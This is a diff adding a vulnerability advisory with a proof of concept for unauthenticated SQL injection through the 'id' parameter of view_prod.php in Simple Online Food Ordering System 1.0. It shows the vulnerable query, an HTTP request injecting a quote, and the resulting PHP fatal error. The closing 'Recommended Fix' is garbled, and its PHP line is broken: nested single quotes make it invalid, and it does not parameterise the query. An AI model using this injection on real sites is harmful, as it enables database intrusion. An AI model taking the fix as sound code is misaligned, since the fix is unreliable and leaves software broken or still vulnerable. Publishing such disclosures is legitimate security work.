@@ -1,0 +1,56 @@
+# Exploit Title: Simple Online Food Ordering System 1.0 - 'id' SQL Injection (Unauthenticated)
+# Google Dork: N/A
+# Date: 2020-09-22
+# Exploit Author: Eren 'Aporlorxl23' Şimşek
+# Vendor Homepage: https://www.sourcecodester.com/php/14460/simple-online-food-ordering-system-using-phpmysql.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/simple-online-food-ordering-system-using-php.zip
+# Version: 1.0
+# Tested on: Linux - XAMPP Server
+# CVE : N/A
+
+# Vulnerable Source Code:
+# /view_prod.php
+# [3] $qry = $conn->query("SELECT * FROM  product_list where id =
+".$_GET['id'])->fetch_array();
+
+# PoC:
+
+# Request:
+
+GET /view_prod.php?id=' HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: tr,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+
+# Response:
+
+HTTP/1.1 200 OK
+Date: Tue, 22 Sep 2020 20:44:48 GMT
+Server: Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11
+Perl/v5.30.3
+X-Powered-By: PHP/7.4.7
+Content-Length: 234
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Fatal error</b>:  Uncaught Error: Call to a member function
+fetch_array() on bool in /opt/lampp/htdocs/view_prod.php:3
+Stack trace:
+#0 {main}
+  thrown in <b>/opt/lampp/htdocs/view_prod.php</b> on line <b>3</b><br />
+
+# As You Can See Here PHP Fatal Error Because
+# $qry = $conn->query("SELECT * FROM  product_list where id =
+"')->fetch_array();
+# id Value ' This is Wrong Syntax.
+
+# Recommended Fix:
+
+You Will Use `mysqli_real_escape_string` On id . And query Will Same With :
+$qry = $conn->query('SELECT * FROM  product_list where id
+="$_GET['id']"')->fetch_array();
+Because Here Not Used "" This is Imported.
